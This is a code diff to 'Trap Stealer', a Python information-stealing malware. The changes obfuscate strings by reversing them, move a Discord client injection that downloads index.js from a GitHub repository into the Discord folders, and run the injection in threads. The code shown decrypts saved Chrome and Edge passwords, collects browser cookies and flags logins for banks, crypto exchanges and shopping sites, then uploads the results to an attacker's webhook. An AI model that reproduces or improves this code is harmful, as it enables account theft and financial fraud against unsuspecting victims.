@@ -326,6 +326,7 @@ def LoadUrlib(hook, data='', files='', headers=''):
 Dscptb= 'BTPdrocsiD'[::-1];Dsccana = 'yranaCdrocsiD'[::-1]
 Dscdev = 'tnempoleveDdrocsiD'[::-1]
 def NoDiscord():
+    ind = "sj.xedni"
     folder_list = f['Discord', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
     for folder_name in folder_list:
         folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
@@ -337,22 +338,14 @@ def NoDiscord():
                         with open(file_path, "w+", encoding="utf-8") as f:
                             f.write('error')
 
-try:
-    if NoDiscord == True:
-        NoDiscord()
-        injection = False
-    else:
-        pass
-except:
-    pass
 
-ind = "sj.xedni"
-
-#You can put an custom one only if there %webhook% in the script
-
-inj_url = f"https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/{ind[::-1]}"
 
 def inj_discord():
+    ind = "sj.xedni"
+
+
+    inj_url = f"https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/{ind[::-1]}"
+
     folder_list = f['Discord', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
     for folder_name in reversed(folder_list):
         folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
@@ -365,10 +358,7 @@ def inj_discord():
                         with open(file_path, "w", encoding="utf-8") as f:
                             f.write(inj_content)
 
-if injection == True:
-    try:inj_discord()
-    except:pass
-else:pass
+
 
 pas = 'drowssaP'
 def systemInfo():
@@ -917,25 +907,29 @@ def getPassw(path, arg):
     cursor.close()
     conn.close()
     os.remove(tempfold)
-
+    es = 'tpyrc_so'
+    ess= 'yek_detpyrcne'
     pathKey = path + "/Local State"
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
-    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+    master_key = b64decode(local_state[es[::-1]][ess[::-1]])
     master_key = CryptUnprotectData(master_key[5:])
-    keyword = [
-    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)']
+    keys = [
+    'liam', ')moc.esabnioc//:sptth(]esabnioc[', ')moc.xilften//:sptth(]xilften[' ,')moc.rebu//:sptth(]rebu[' ,'otpyrc' ,')moc.npvsserpxe//:sptth(]npvsserpxe[' ,')moc.yensid//:sptth(]yensid[' ,')moc.buhnrop//:sptth(]buhnrop[' ,')moc.margelet//:sptth(]margelet[' ,')moc.lloryhcnurc//:sptth(]lloryhcnurc[' ,')moc.kooltuo//:sptth(]kooltuo[' ,')moc.liamtoh//:sptth(]liamtoh[' ,')moc.ecnanib//:sptth(]ecnanib[' ,'lles' ,'yub' ,')moc.xobx//:sptth(]xobx[' ,')moc.obh//:sptth(]obh[' ,')moc.noitatsyalp//:sptth(]noitatsyalp[' ,')moc.sserpxeila//:sptth(]sserpxeila[' ,')moc.yabe//:sptth(]yabe[' ,')moc.nozama//:sptth(]nozama[' ,')moc.nigiro//:sptth(]nigiro[' ,')moc.lapyap//:sptth(]lapyap[' ,'knab' ,')ten.tfarcenim//:sptth(]tfarcenim[' ,')moc.hctiwt//:sptth(]hctiwt[' ,')moc.xolbor//:sptth(]xolbor[' ,')moc.oohay//:sptth(]oohay[' ,')moc.yfitops//:sptth(]yfitops[' ,')moc.semagcipe//:sptth(]semagcipe[' ,'drac' ,')moc.koobecaf//:sptth(]koobecaf[' ,')moc.rettiwt//:sptth(]rettiwt[' ,')moc.kotkit//:sptth(]kotkit[']
     for row in data: 
         if row[0] != '':
-            for wa in keyword:
+            for wa in keys[::-1]:
                 old = wa
                 if "https" in wa:
                     tmp = wa
                     wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
                     if not old in paswWords: paswWords.append(old)
-            Passw.append(f"URL: {row[0]} | Username: {row[1]} | {pas[::-1]}: {DecryptValue(row[2], master_key)}")
+            us = 'emanresU'
+            ur = 'lrU'
+            Passw.append(f"{ur[::-1]}: {row[0]} | {us[::-1]}: {row[1]} | {pas[::-1]}: {DecryptValue(row[2], master_key)}")
             PasswCount += 1
     writeforfile(Passw, 'passw')
+    
     
 def getinfo():
     try:
@@ -1199,7 +1193,10 @@ def paaaz():
     try:
         file = os.getenv("TEMP") + f"\wpcook.txt"
         filename = "wpcook.txt"
-
+        with open(file, 'r') as fp:
+            lines = len(fp.readlines())
+            
+            
         a = upload_file(file)
         embed_fields = [{"name": f"{filename}", "value": f"[Click here to download]({a})"}]
         pas = 'eikooC'
@@ -1210,7 +1207,7 @@ def paaaz():
             "embeds": [
                 {
                     "title": f"🍪 Trap Stealer {pas[::-1]}",
-                    "description": f"Number of {pas[::-1]} : {coonum}",
+                    "description": f"Number of {pas[::-1]} : {lines}",
                     "color": 0xffb6c1,
                     "fields": embed_fields,
                     "thumbnail": {
@@ -1226,7 +1223,6 @@ def paaaz():
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
     except:pass
 
-coonum = 0
 def getcook():
     global coonum
 
@@ -1251,7 +1247,7 @@ def getcook():
     appdata=os.getenv('LOCALAPPDATA')
     browsers={'google-chrome':appdata+'\\Google\\Chrome\\User Data','microsoft-edge':appdata+'\\Microsoft\\Edge\\User Data'}
     profiles=['Default','Profile 1','Profile 2','Profile 3','Profile 4','Profile 5']
-
+    n = 0
     cookies=[]
     for path in browsers.values():
         try:
@@ -1274,9 +1270,10 @@ def getcook():
                             cookies.append({'host': row[0], 'name': row[1], 'path': row[2], 'value': cookie, 'expires': row[4]})
                     conn.close()
                     
-                    with open(path2, mode='a', encoding='utf-8') as f:
+                    with open(path2, mode='w', encoding='utf-8') as f:
                         f.write("Trap Stealer\n")
                         for cookie_entry in cookies:
+                            n +=1
                             f.write(str(cookie_entry) + "\n")
                 except Exception as e:
                     pass
@@ -1378,6 +1375,27 @@ def GatherAll():
     ]
     Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
     aa = []
+    global injection
+    global DiscordStop
+    if injection == True:
+        try:
+            ij = threading.Thread(target=inj_discord)
+            ij.start()
+            aa.append(ij)
+        except:pass
+    else:pass
+    
+    try:
+        if NoDiscord == True:
+            no = threading.Thread(target=NoDiscord)
+            no.start()
+            aa.append(no)
+            injection = False
+        else:
+            pass
+    except:
+        pass
+
     if Fakegen == True:
         us = threading.Thread(target=fakegen)
         us.start()
